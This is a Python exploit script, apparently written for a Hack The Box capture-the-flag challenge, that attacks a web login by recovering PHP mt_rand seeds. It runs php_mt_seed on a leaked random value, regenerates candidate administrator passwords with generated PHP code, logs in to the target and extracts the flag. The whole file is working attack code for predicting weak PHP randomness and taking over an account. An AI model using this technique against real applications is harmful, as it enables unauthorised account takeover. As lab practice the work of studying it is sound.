#!/usr/bin/env python3

import requests
import re
import subprocess
import os

TARGET = "http://94.237.122.241:57765"

def test_login(username, password):
    """Test login with given credentials"""
    session = requests.Session()
    data = {
        'username': username,
        'password': password
    }
    response = session.post(f"{TARGET}/login-user", data=data, allow_redirects=True)
    success = "Welcome" in response.text
    
    if success:
        
        flag_response = session.get(f"{TARGET}/show")
        flag_match = re.search(r'HTB\{[^}]+\}', flag_response.text)
        if flag_match:
            return flag_match.group()
    
    return success

def main():
    print("🔍 Testing different skip patterns...")
    
    
    first_value = 1058285600
    
    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    
   
    for num_skips in range(8, 15):  # Try 8-14 skips
        print(f"\n[+] Testing with {num_skips} skips...")
        
       
        skip_cmd = ["./php_mt_seed-main/php_mt_seed"] + ["0", "0", "0", "0"] * num_skips + [str(first_value), str(first_value), "0", "2147483647"]
        
        try:
            result = subprocess.run(skip_cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout
            
        
            seed_matches = re.findall(r'seed = 0x[a-f0-9]+ = (\d+)', output)
           
            if seed_matches:
                print(f"    Found {len(seed_matches)} seeds: {seed_matches[:3]}...")
                
               
                for seed_str in seed_matches[:3]:  # Test first 3 seeds only
                    seed = int(seed_str)
                    
                 
                    test_script = f"""<?php
mt_srand({seed});

$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$l = strlen($characters);
$admin_pwd = "";
for ($i = 0; $i < 10; $i++) {{
    $admin_pwd .= $characters[mt_rand() % $l];
}}

// Skip the appropriate number of calls
for ($i = 0; $i < {num_skips - 10}; $i++) {{
    mt_rand();
}}

$next = mt_rand();
echo $admin_pwd . "\\n" . $next . "\\n";
?>"""
                    
                    with open('test_pattern.php', 'w') as f:
                        f.write(test_script)
                    
                    php_result = subprocess.run(['php', 'test_pattern.php'], capture_output=True, text=True)
                    lines = php_result.stdout.strip().split('\n')
                    
                    if len(lines) >= 2:
                        potential_password = lines[0]
                        generated_value = int(lines[1])
                        
                        if generated_value == first_value:
                            print(f"        MATCH! Seed {seed}, Password: {potential_password}")
                            
                            # Test login
                            result = test_login('HTBAdministrator', potential_password)
                            if result == True:
                                print(f"         LOGIN SUCCESS with password: {potential_password}")
                            elif isinstance(result, str):
                                print(f"         FLAG FOUND: {result} ")
                                return result
                            else:
                                print(f"         Login failed")
                        
            else:
                print(f"    No seeds found")
                
        except Exception as e:
            print(f"    Error: {e}")

    
    print(f"\n[+] Testing reverse pattern (uploads happen before admin password)...")
    
   
    
    for offset in range(1, 6):
        print(f"\n[+] Testing direct seed from value at offset {offset}...")
        
        
        cmd = ["./php_mt_seed-main/php_mt_seed", str(first_value)]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout
            
            seed_matches = re.findall(r'seed = 0x[a-f0-9]+ = (\d+)', output)
            
            if seed_matches:
                for seed_str in seed_matches[:2]:
                    seed = int(seed_str)
                    
                    # Try generating password at different positions
                    test_script = f"""<?php
mt_srand({seed});

$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$l = strlen($characters);

// Skip some initial values
for ($i = 0; $i < {offset}; $i++) {{
    mt_rand();
}}

// Generate admin password
$admin_pwd = "";
for ($i = 0; $i < 10; $i++) {{
    $admin_pwd .= $characters[mt_rand() % $l];
}}

echo $admin_pwd . "\\n";
?>"""
                    
                    with open('test_reverse.php', 'w') as f:
                        f.write(test_script)
                    
                    php_result = subprocess.run(['php', 'test_reverse.php'], capture_output=True, text=True)
                    potential_password = php_result.stdout.strip()
                    
                    if potential_password:
                        print(f"        Testing password: {potential_password}")
                        
                        result = test_login('HTBAdministrator', potential_password)
                        if result == True:
                            print(f"        LOGIN SUCCESS with password: {potential_password}")
                        elif isinstance(result, str):
                            print(f"         FLAG FOUND: {result} ")
                            return result
        
        except Exception as e:
            print(f"    Error: {e}")

if __name__ == "__main__":
    main()

